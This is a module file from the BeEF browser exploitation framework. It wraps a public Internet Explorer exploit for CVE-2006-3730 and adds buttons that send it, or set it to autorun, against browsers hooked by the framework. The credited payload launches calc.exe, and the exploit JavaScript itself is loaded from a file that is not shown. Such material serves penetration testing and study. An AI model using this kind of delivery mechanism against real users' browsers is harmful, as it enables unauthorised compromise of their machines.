<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<!--

BeEF: the following is the boiler plate from the exploit

..::[ jamikazu presents ]::..

Microsoft Internet Explorer WebViewFolderIcon (setSlice) Exploit (0day)
Works on all Windows XP versions including SP2

Author: jamikazu 
Mail: jamikazu@gmail.com

Bug discovered by Computer H D Moore (http://www.metasploit.com)

Credit: metasploit, SkyLined

invokes calc.exe if successful 

-->

<script>

	function get_b64_code_2006_3730() {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';
		
		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('CVE-2006-3730', get_b64_code_2006_3730());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_2006_3730());
	}

	// add construct code to DOM
	Element.addMethods();
	
</script>

<!-- PAGE CONTENT -->
<div id="module_header">CVE-2006-3730 (MS06-057)</div>
This module will launch calc.exe (Calculater) on Microsoft Windows. A vulnerability in 
Microsoft Internet Explorer WebViewFolderIcon (setSlice) is exploited.<br><br>
<div id="module_subsection">
	<form name="myform">
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>
	</form>
</div>

